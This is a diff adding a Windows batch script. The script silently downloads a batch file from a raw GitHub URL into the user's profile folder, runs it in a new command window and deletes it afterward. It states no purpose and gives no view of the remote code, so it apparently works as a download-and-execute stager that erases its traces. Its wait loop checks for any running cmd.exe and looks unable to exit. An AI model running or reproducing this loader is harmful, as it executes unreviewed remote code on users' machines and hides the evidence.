@@ -1,0 +1,24 @@
+@echo off
+setlocal
+
+:: Create a temporary file
+set "tempFile=%userprofile%\q.bat"
+
+:: Download the q.bat file
+del %tempFile% 2>nul
+curl -s -o %tempFile% https://raw.githubusercontent.com/JoshBeCute/letssee/main/batch
+
+:: Run the q.bat file in a separate window
+start cmd /k "call %tempFile% & del %tempFile%"
+
+:: Wait for the user to close the command prompt window
+:waitForClose
+timeout /t 1 >nul
+tasklist | find /i "cmd.exe" >nul
+if %errorlevel% == 0 (
+    goto waitForClose
+)
+
+:: Clean up if the command prompt is closed
+del %tempFile% 2>nul
+endlocal
